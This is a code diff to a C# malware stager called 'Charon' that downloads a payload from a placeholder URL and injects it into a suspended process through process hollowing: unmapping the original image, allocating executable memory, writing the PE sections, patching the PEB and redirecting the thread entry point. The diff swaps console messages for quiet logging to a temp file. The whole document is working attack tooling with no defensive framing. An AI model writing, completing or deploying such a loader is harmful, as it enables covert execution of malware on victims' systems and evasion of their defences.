@@ -1,9 +1,23 @@
 using System;
+using System.IO;
 using System.Net;
 using System.Runtime.InteropServices;
 
 namespace Charon
 {
+    internal static class Log
+    {
+        static string path = Path.Combine(Path.GetTempPath(), "charon.log");
+        public static void W(string msg)
+        {
+            try { File.AppendAllText(path, msg + "\n"); } catch {}
+        }
+        public static void W(string fmt, params object[] args)
+        {
+            W(string.Format(fmt, args));
+        }
+    }
+
     public class Stager
     {
         public static void Main()
@@ -18,19 +32,19 @@ namespace Charon
 
             try
             {
-                Console.WriteLine("[*] Downloading payload from %DOWNLOAD_URL%");
+                Log.W("[*] Downloading payload from %DOWNLOAD_URL%");
                 byte[] peBytes;
                 using (WebClient wc = new WebClient())
                 {
                     peBytes = wc.DownloadData("%DOWNLOAD_URL%");
                 }
-                Console.WriteLine("[+] Downloaded {0} bytes", peBytes.Length);
+                Log.W("[+] Downloaded {0} bytes", peBytes.Length);
 
                 RunPE.Execute(peBytes, @"%SPAWN_PROCESS%");
             }
             catch (Exception ex)
             {
-                Console.WriteLine("[-] Stager error: {0}", ex.Message);
+                Log.W("[-] Stager error: {0}", ex.Message);
             }
         }
     }
@@ -113,19 +127,19 @@ namespace Charon
             // --- Parse PE headers ---
             if (payload.Length < 0x40 || BitConverter.ToUInt16(payload, 0) != 0x5A4D)
             {
-                Console.WriteLine("[-] Invalid PE: bad MZ header");
+                Log.W("[-] Invalid PE: bad MZ header");
                 return;
             }
 
             int e_lfanew = BitConverter.ToInt32(payload, 0x3C);
             if (e_lfanew < 0 || e_lfanew + 4 > payload.Length)
             {
-                Console.WriteLine("[-] Invalid PE: bad e_lfanew");
+                Log.W("[-] Invalid PE: bad e_lfanew");
                 return;
             }
             if (BitConverter.ToUInt32(payload, e_lfanew) != 0x00004550)
             {
-                Console.WriteLine("[-] Invalid PE: bad PE signature");
+                Log.W("[-] Invalid PE: bad PE signature");
                 return;
             }
 
@@ -133,7 +147,7 @@ namespace Charon
             ushort magic = BitConverter.ToUInt16(payload, optHeaderOffset);
             if (magic != 0x20B)
             {
-                Console.WriteLine("[-] Not a PE32+ (x64) binary, magic: 0x{0:X}", magic);
+                Log.W("[-] Not a PE32+ (x64) binary, magic: 0x{0:X}", magic);
                 return;
             }
 
@@ -144,7 +158,7 @@ namespace Charon
             ushort numberOfSections = BitConverter.ToUInt16(payload, e_lfanew + 6);
             ushort sizeOfOptionalHeader = BitConverter.ToUInt16(payload, e_lfanew + 20);
 
-            Console.WriteLine("[+] PE parsed: ImageBase=0x{0:X} SizeOfImage=0x{1:X} EntryRVA=0x{2:X} Sections={3}",
+            Log.W("[+] PE parsed: ImageBase=0x{0:X} SizeOfImage=0x{1:X} EntryRVA=0x{2:X} Sections={3}",
                 imageBase, sizeOfImage, entryPointRva, numberOfSections);
 
             // --- Create suspended process ---
@@ -156,10 +170,10 @@ namespace Charon
                 IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED,
                 IntPtr.Zero, null, ref si, out pi))
             {
-                Console.WriteLine("[-] CreateProcessW failed: {0}", Marshal.GetLastWin32Error());
+                Log.W("[-] CreateProcessW failed: {0}", Marshal.GetLastWin32Error());
                 return;
             }
-            Console.WriteLine("[+] Created suspended process PID={0}", pi.dwProcessId);
+            Log.W("[+] Created suspended process PID={0}", pi.dwProcessId);
 
             // Allocate 16-byte aligned CONTEXT
             IntPtr rawCtx = Marshal.AllocHGlobal(CONTEXT64_SIZE + 16);
@@ -174,41 +188,41 @@ namespace Charon
 
                 if (!GetThreadContext(pi.hThread, ctx))
                 {
-                    Console.WriteLine("[-] GetThreadContext failed: {0}", Marshal.GetLastWin32Error());
+                    Log.W("[-] GetThreadContext failed: {0}", Marshal.GetLastWin32Error());
                     TerminateProcess(pi.hProcess, 1);
                     return;
                 }
 
                 long pebAddress = Marshal.ReadInt64(ctx, CTX_RDX_OFFSET);
-                Console.WriteLine("[+] PEB at 0x{0:X}", pebAddress);
+                Log.W("[+] PEB at 0x{0:X}", pebAddress);
 
                 byte[] buf8 = new byte[8];
                 uint br;
                 ReadProcessMemory(pi.hProcess, (IntPtr)(pebAddress + 0x10), buf8, 8, out br);
                 long originalImageBase = BitConverter.ToInt64(buf8, 0);
-                Console.WriteLine("[+] Original ImageBase=0x{0:X}", originalImageBase);
+                Log.W("[+] Original ImageBase=0x{0:X}", originalImageBase);
 
                 // --- Hollow ---
                 uint unmapResult = NtUnmapViewOfSection(pi.hProcess, (IntPtr)originalImageBase);
-                Console.WriteLine("[*] NtUnmapViewOfSection = 0x{0:X}", unmapResult);
+                Log.W("[*] NtUnmapViewOfSection = 0x{0:X}", unmapResult);
 
                 IntPtr newBase = VirtualAllocEx(pi.hProcess, (IntPtr)imageBase,
                     sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
                 if (newBase == IntPtr.Zero)
                 {
-                    Console.WriteLine("[-] VirtualAllocEx failed: {0}", Marshal.GetLastWin32Error());
+                    Log.W("[-] VirtualAllocEx failed: {0}", Marshal.GetLastWin32Error());
                     TerminateProcess(pi.hProcess, 1);
                     return;
                 }
-                Console.WriteLine("[+] Allocated at 0x{0:X}", (long)newBase);
+                Log.W("[+] Allocated at 0x{0:X}", (long)newBase);
 
                 // --- Write PE ---
                 uint bw;
                 byte[] headerBytes = new byte[sizeOfHeaders];
                 Buffer.BlockCopy(payload, 0, headerBytes, 0, (int)sizeOfHeaders);
                 WriteProcessMemory(pi.hProcess, newBase, headerBytes, sizeOfHeaders, out bw);
-                Console.WriteLine("[+] Wrote headers ({0} bytes)", bw);
+                Log.W("[+] Wrote headers ({0} bytes)", bw);
 
                 int sectionTableOffset = e_lfanew + 24 + sizeOfOptionalHeader;
                 for (int i = 0; i < numberOfSections; i++)
@@ -225,14 +239,14 @@ namespace Charon
                     Buffer.BlockCopy(payload, (int)pointerToRawData, section, 0, (int)sizeOfRawData);
                     WriteProcessMemory(pi.hProcess, (IntPtr)((long)newBase + virtualAddress),
                         section, sizeOfRawData, out bw);
-                    Console.WriteLine("[+] Section {0}: VA=0x{1:X} Size=0x{2:X}", i, virtualAddress, sizeOfRawData);
+                    Log.W("[+] Section {0}: VA=0x{1:X} Size=0x{2:X}", i, virtualAddress, sizeOfRawData);
                 }
 
                 if ((long)newBase != originalImageBase)
                 {
                     byte[] baseBytes = BitConverter.GetBytes((long)newBase);
                     WriteProcessMemory(pi.hProcess, (IntPtr)(pebAddress + 0x10), baseBytes, 8, out bw);
-                    Console.WriteLine("[+] Updated PEB ImageBase");
+                    Log.W("[+] Updated PEB ImageBase");
                 }
 
                 long entryPoint = (long)newBase + entryPointRva;
@@ -240,18 +254,18 @@ namespace Charon
 
                 if (!SetThreadContext(pi.hThread, ctx))
                 {
-                    Console.WriteLine("[-] SetThreadContext failed: {0}", Marshal.GetLastWin32Error());
+                    Log.W("[-] SetThreadContext failed: {0}", Marshal.GetLastWin32Error());
                     TerminateProcess(pi.hProcess, 1);
                     return;
                 }
-                Console.WriteLine("[+] EntryPoint set to 0x{0:X}", entryPoint);
+                Log.W("[+] EntryPoint set to 0x{0:X}", entryPoint);
 
                 ResumeThread(pi.hThread);
-                Console.WriteLine("[+] Thread resumed — payload should be running in PID {0}", pi.dwProcessId);
+                Log.W("[+] Thread resumed — payload should be running in PID {0}", pi.dwProcessId);
             }
             catch (Exception ex)
             {
-                Console.WriteLine("[-] RunPE exception: {0}", ex.Message);
+                Log.W("[-] RunPE exception: {0}", ex.Message);
                 TerminateProcess(pi.hProcess, 1);
             }
             finally
